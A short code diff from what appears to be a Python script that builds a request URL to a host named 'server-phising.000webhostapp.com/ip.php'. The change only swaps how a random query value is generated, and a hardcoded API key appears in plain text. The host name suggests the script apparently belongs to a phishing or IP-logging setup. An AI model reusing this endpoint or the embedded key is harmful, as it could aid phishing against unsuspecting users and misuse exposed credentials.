@@ -2,7 +2,7 @@ import requests, random, json, sys, time, os
 
 
 api_key = '2388107e74e7fe5424554967771b568b';
-rand = random.random()
+rand = random.randint(000, 999)
 url = 'https://server-phising.000webhostapp.com/ip.php?rand='+str(rand)
 
 banner = '''
